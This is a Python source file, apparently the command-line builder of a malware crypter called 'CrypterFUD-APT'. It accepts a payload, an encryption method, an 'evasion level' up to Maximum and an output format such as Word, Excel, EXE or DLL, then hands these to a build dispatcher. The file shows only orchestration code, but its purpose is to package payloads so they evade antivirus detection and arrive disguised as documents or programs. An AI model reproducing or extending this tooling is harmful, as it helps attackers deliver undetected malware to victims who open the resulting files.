# =======================
# CORE - Orchestration
# =======================

# core/builder.py
import argparse
import json
import os
from .dispatcher import BuildDispatcher
from .logger import Logger

class CLIBuilder:
    def __init__(self):
        self.logger = Logger()
        
    def parse_args(self):
        parser = argparse.ArgumentParser(description='CrypterFUD-APT CLI Builder')
        parser.add_argument('--payload', required=True, help='Path to payload file')
        parser.add_argument('--config', help='Path to config JSON file')
        parser.add_argument('--output', default='./output', help='Output directory')
        parser.add_argument('--encryption', choices=['AES-GCM', 'AES-CBC+XOR', 'ChaCha20'], 
                          default='AES-GCM', help='Encryption method')
        parser.add_argument('--evasion', choices=['Basic', 'Medium', 'High', 'Maximum'],
                          default='High', help='Evasion level')
        parser.add_argument('--format', choices=['Word', 'Excel', 'EXE', 'DLL'],
                          default='Word', help='Output format')
        return parser.parse_args()
        
    def load_config(self, config_path):
        if config_path and os.path.exists(config_path):
            with open(config_path, 'r') as f:
                return json.load(f)
        return {}
        
    def build(self):
        args = self.parse_args()
        config = self.load_config(args.config)
        
        # Merge CLI args with config
        build_config = {
            'payload_path': args.payload,
            'output_dir': args.output,
            'encryption_method': args.encryption,
            'evasion_level': args.evasion,
            'target_format': args.format,
            **config
        }
        
        dispatcher = BuildDispatcher(build_config, self.logger.log)
        success, output_path = dispatcher.build_all()
        
        if success:
            print(f"Build completed: {output_path}")
            return 0
        else:
            print("Build failed!")
            return 1

if __name__ == "__main__":
    builder = CLIBuilder()
    exit(builder.build())
